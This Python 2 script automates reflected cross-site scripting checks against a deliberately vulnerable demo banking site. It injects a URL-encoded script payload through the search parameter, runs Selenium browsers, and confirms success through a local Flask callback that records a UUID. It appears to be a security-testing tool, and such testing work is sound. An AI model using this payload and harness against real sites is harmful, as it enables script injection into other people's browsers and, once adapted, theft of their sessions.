from flask import Flask, session, redirect, url_for, escape, request
import uuid
import time
import threading
from queue import Queue
from selenium import webdriver
import logging

#Test target:
test_target= "http://demo.testfire.net/search.aspx?txtSearch=" #IBM hosted test site. XSS vulnerable search parameter
payload_0 = "%3Cscript%3Ewindow.location%3D%27http%3A%2F%2F127.0.0.1%3A5000%2Fxss%3Fvalue%3D" #payload is split so we can insert the UUID in the appropriate spot
payload_1 = "%27%3C%2Fscript%3E"

print_lock = threading.Lock()
q = Queue()
app = Flask(__name__)

#disable extra verbosity in Flask, dont need it here.
log = logging.getLogger('werkzeug')
log.disabled = True
app.logger.disabled = True

successes = []

#dirt simple flask API endpoint just to verify if XSS was successful
@app.route('/xss', methods=['GET'])
def xss():
    valuedump(request.args.get('value')) #Do something with our UUID result
    return "xss successful" #ez pz

#need to splinter flask into it's own thread
def flaskThread():
    print "Starting Flask Thread"
    app.run()

def requestJob(payload):
    browser=webdriver.Firefox()
    browser.get(payload['target'] + payload['p_1'] + str(payload['UUID']) + payload['p_2']) #join the payload series together and toss it into firefox
    start = time.time()
    while str(payload['UUID']) not in successes:
        if time.time() - start > 5.99: # if it takes too long, go ahead and drop the browser
            browser.quit()
            return
        time.sleep(.3)
    browser.quit() #make sure we close all the windows when we are done with them.

def valuedump(value): #do something with our succesful XSS
    successes.append(value)

def payloadbuilder(target_site, pload1, pload2): #dummy payload builder, when we customize per attempt it will be done here

    payload = {
        "target": target_site,
        "p_1": pload1,
        "p_2": pload2,
        "UUID": uuid.uuid4() #generate a UUID for the transaction we can store for future reference
    }
    return payload

def firefoxThreader(payload): #
    while True:
        worker = q.get()
        requestJob(payload)
        q.task_done()

if __name__ == '__main__':
    tFlask=threading.Thread(target=flaskThread)
    tFlask.daemon = True #flask runs as a daemon, this ensures flask is handled appropriately and passes along exit events like SIGINT
    tFlask.start()
    for i in range(5): #5 threads
        r=threading.Thread(target=firefoxThreader, args=(payloadbuilder(test_target, payload_0, payload_1),))
        r.daemon = True
        r.start()
    start = time.time()
    for worker in range(20): #20 workers
        q.put(worker)
    q.join()
    print len(successes)
    print('Entire job took:',time.time() - start)
